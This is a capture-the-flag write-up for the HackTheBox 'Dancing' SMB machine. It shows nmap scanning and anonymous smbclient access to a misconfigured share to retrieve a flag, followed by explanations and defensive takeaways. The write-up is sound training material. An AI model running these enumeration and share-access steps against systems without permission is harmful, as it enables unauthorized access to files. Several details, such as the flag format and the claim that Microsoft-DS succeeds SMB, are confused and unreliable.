# HackTheBox - Dancing (SMB CTF)

## Challenge Info

* Platform: HackTheBox
* Challenge Name: Dancing
* Category: Network (SMB)
* Difficulty: Very Easy
* Status: Solved Theoretically (can't spawn machine, already solved)

## Task Description
* We have been given access to a machine which is already vulnerable, The task is to enumerate it(Gather as much detailed information as possible about the target
  system), identify open ports, and exploit them to gain access.

## Thought Process & Methodology
## Enumeration

### Step 1: Nmap Scan

* Firstly we are going to use `nmap` to find which port is open
    `nmap -sC -sV <target-ip>`
  * -sC is just we telling nmap to use your own default script like service detection, banner grabbing etc.
  * -sV is to detect the version of ports
  * `nmap -A <target-ip>` -> -sC + -sV = -A (Agressive Scan)
  * Result:
    ```bash
    PORT   STATE SERVICE 
    135/tcp open  msrpc
    139/tcp open  netbios-ssn
    445/tcp open  microsoft-ds
    5985/tcp open wsman    
  * This shows that SMB protocol (port 445) is open.

### Step 2: Connection

* To connect with the SMB protocol port we use `smbclient -p 445 -L \\<target-ip>`
* `-L` is used for lisiting the available shares
* The result of the above command will show the share on the SMB server at IP 10.129.1.12, but it fails to connect with the error NT_STATUS_RESOURCE_NAME_NOT_FOUND, 4
  which indicates that no workgroup is available.
* Result:
  ```bash
  Sharename       Type     Comment
  Admin$          Disk     Remote Admin
  C$              Disk     Default share
  IPC$            IPC      Remote IPC
  WorkShares      Disk
  
### Exploring The System

* Let’s try accessing workShares using this command:
  ```bash
    smbclient -p 445 \\10.129.1.12\WorkShares
* Using `ls` to list the contents of the directory
* Result:
  ```bash
    smb: \> ls
    .                                D          0   Mon Mar 29 04:22:01 2021
    ..                               D          0   Mon Mar 29 04:22:01 2021
    Amy.J                            D          0   Mon Mar 29 04:22:01 2021
    James.P                          D          0   Mon Mar 29 04:22:01 2021

* Workshare is a share that we can access without a password
* we use `get` to access directories
  `smb: \> get james.P`
* To view contents of the directory `ls` is used
  ```bash
    .                                `D          0   Mon Mar 29 04:22:01 2021
    ..                               `D          0   Mon Mar 29 04:22:01 2021
    flag.txt                          D          0   Mon Mar 29 04:22:01 2021
  
* To view it directly from the SMB shell, we can use this command
  `get james.P\flag.txt /dev/stdout`
* Result:
  `THM{c0ngr4ts_y0u_own3d_5MB}`

## What is SMB?
* The SMB (Server Message Block) protocol is a network communication protocol that enables the sharing of files, printers, and other resources on a network, 
  primarily between client and server computers

## What is Microsoft-DS?
* Microsoft-DS (Microsoft Directory Service) is a network file sharing protocol used by Microsoft Windows operating systems for sharing files and printers over a network.
* It operates on port 445 (TCP/UDP) and is a successor to the older SMB (Server Message Block) protocol.

## Why Use "//" in smbclient -p 445 -L \\<target-ip>?
* SMB (Server Message Block) came from DOS and Windows land, not UNIX.
* In DOS/Windows, paths were written like:
  `C:\Users\recognized\Documents`
* And when networking came along, Microsoft needed a way to represent remote network resources. They invented UNC (Universal Naming Convention).
  UNC paths look like this:
  `\\SERVER\Share\Folder\File.txt`
* Here’s the breakdown:
   ```bash
    \\SERVER → the hostname or IP of the server
    \Share → the name of the shared folder
    \Folder\File.txt → the path inside the share

## TakeAway
* Enumeration is key: proper scanning (nmap) reveals the attack surface.
* SMB often exposes sensitive information if misconfigured (like WorkShares with no password).
* Anonymous access = a serious security risk. Always restrict/disable it in real-world environments.
* SMB shares should be monitored and access-controlled to prevent unauthorized file retrieval.
* This challenge reinforced why legacy protocols and weak defaults are dangerous in production systems.

## Note
* This is a practice scenario. Machines on platforms like TryHackMe are intentionally vulnerable
* In real-world situations, gaining root access this easily is highly unlikely.
> If you enumerate properly, the exploit usually reveals itself

## Disclaimer

You may use this Knowledge:

* To learn security concepts
* For testing in controlled environments with explicit permission
* As part of ethical hacking or cybersecurity research

You may not use this Knowledge:

* For unauthorized access to systems
* To harm, disrupt, or compromise any network, server, or individual

By reading this write-up, you agree that any and all responsibility lies with you, the user.

